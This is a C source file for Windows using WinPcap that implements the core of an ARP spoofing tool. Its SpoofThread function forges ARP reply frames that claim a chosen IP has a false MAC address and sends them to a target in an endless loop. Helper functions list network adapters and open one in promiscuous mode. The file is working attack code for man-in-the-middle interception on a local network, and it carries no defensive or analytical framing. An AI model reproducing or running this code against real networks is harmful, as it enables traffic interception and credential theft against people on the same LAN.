

// Tell szTarget szIP's MAC is ucPretendMAC
typedef struct _ARPSPOOF
{
	unsigned char	ucSelfMAC[6]; // self MAC
	unsigned char	szTarget[16]; // target IP Address
	unsigned char	ucTargetMAC[6]; // target MAC
	unsigned char	szIP[16]; // IP2's IP
	unsigned char	ucIPMAC[6]; //IP2's TRUE MAC used to restor local arp cache
	unsigned char	ucPretendMAC[6]; //IP2's Pretend MAC
	pcap_t *adhandle; // net adapter handle

} ARPSPOOF, *PARPSPOOF;

//
// 由IP地址得到网卡地址的函数
//
BOOL GetMac(char szIP[], unsigned char ucMacAddr[])
{
	ULONG macAddLen=6;
	memset(ucMacAddr, 0xff, sizeof(ucMacAddr));
	if (SendARP(inet_addr(szIP), (IPAddr) NULL,(PULONG) ucMacAddr, &macAddLen) == NO_ERROR)
		return TRUE;
	else
		return FALSE;
}

//
// 发送RARP数据包的欺骗线程
//
UINT SpoofThread(LPVOID lparam)
{	
	ARPSPOOF arpspoof;
	memcpy(&arpspoof, (PARPSPOOF) lparam, sizeof(ARPSPOOF));
	u_char ucFrame[ARP_LEN];

	// 设置Ethernet头
	ETHeader eh = { 0 };
	memcpy(eh.dhost, arpspoof.ucTargetMAC, 6);
	memcpy(eh.shost, arpspoof.ucSelfMAC, 6);
	eh.type = htons(ETHERTYPE_ARP);
	memcpy(ucFrame, &eh, sizeof(eh));

	// 设置Arp头
	ARPHeader ah = { 0 };
	ah.hrd = htons(ARPHRD_ETHER);
	ah.eth_type = htons(ETHERTYPE_IP);
	ah.maclen = 6;
	ah.iplen = 4;
	ah.opcode = htons(ARP_REPLY);

	memcpy(ah.smac, arpspoof.ucPretendMAC, 6); //Falsified C's MAC address
	ah.saddr = inet_addr((char *) arpspoof.szIP);  //C's IP address
	memcpy(ah.dmac, arpspoof.ucTargetMAC, 6);
	ah.daddr = inet_addr((char *) arpspoof.szTarget);   //Destination A's IP address

	memcpy(&ucFrame[sizeof(ETHeader)], &ah, sizeof(ah));

	// Loop send RARP Packet 
	while(1)
	{
		if(pcap_sendpacket(arpspoof.adhandle, (const unsigned char *) ucFrame,
			ARP_LEN) < 0)
		{
			printf("Send Packet Error\n");
			return FALSE;
		}

		StaticARP(arpspoof.szIP, &arpspoof.ucIPMAC[0]);
		Sleep(3000); // Sleep 3 sec to restore arp cache
	}
	return TRUE;	
}

//
// 列出可使用的网卡，以及相关的IP、PhysicalAddress、Gateway
//
void ListAdapters()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE], szGateIPAddr[16], *p;
	char szIPAddr[16];
	unsigned char ucPhysicalAddr[6];

    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        return;
    }
    for (d=alldevs; d; d=d->next)
    {
        if (d->addresses != NULL && (p = strchr(d->name, '{')) != NULL
			&& Getadapterbyname(p, szIPAddr, ucPhysicalAddr,szGateIPAddr))
		{
			// 去掉网卡注释右边的空格
			for(int j = strlen(d->description) - 1; j > 0; j--)
			{
				if (d->description[j] == 0x20)
					d->description[j] = '\0';
				else
					break;
			}
			printf("\n  %d. %s\n\tIP Address. . . . . : %s\n", i, d->description, szIPAddr);
			printf("\tPhysical Address. . : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", 
				ucPhysicalAddr[0], ucPhysicalAddr[1], ucPhysicalAddr[2],
				ucPhysicalAddr[3], ucPhysicalAddr[4], ucPhysicalAddr[5]);
			printf("\tDefault Gateway . . : %s\n", szGateIPAddr);
			i ++;
		}

    }  
    if (i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return;
    }

    pcap_freealldevs(alldevs);
}

//
// 入口参数: int uNum 网卡的ID
// 出口参数: unsigned char szIPSelf[] 网卡绑定的IP
// 返回值: 打开网卡的句柄
//

pcap_t* OpenAdapter(int uIndexofAdapter, char szIPSelf[],
					unsigned char ucPhysicalAddr[], char szGateIPAddr[])
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	pcap_t *fp = NULL;
    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE], *p;
    /* 这个API用来获得网卡的列表 */
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        return NULL;
    }
    /* 显示列表的响应字段的内容 */
    for (d=alldevs; d; d=d->next)
    {        
		if (d->addresses != NULL && (p = strchr(d->name, '{')) != NULL
			&& Getadapterbyname(p, szIPSelf, ucPhysicalAddr, szGateIPAddr))
		{	
			if (i == uIndexofAdapter)
			{
				if ((fp = pcap_open_live(d->name, // 设备名称
					65536,     // portion of the packet to capture.
					// 65536 grants that the whole packet will be captured on all the MACs.
					1,       // 混杂模式
					1, //读超时为1ms，越小越好
					errbuf     // error buffer
					)) == NULL)
				{
					fprintf(stderr,"\nUnable to open the adapter. \
						%s is not supported by WinPcap\n", d->name);
					pcap_freealldevs(alldevs);
					return NULL;
				}
				else
				{
					// 去掉网卡注释右边的空格
					for(int j = strlen(d->description) - 1; j > 0; j--)
					{
						if (d->description[j] == 0x20)
							d->description[j] = '\0';
						else
							break;
					}
					printf("[*] Bind on %s %s ...\n", szIPSelf, d->description);
					return fp;
				}
			}
			i ++;
		}
    }
    if (i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return FALSE;
    }
    /* We don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);
	return NULL;
}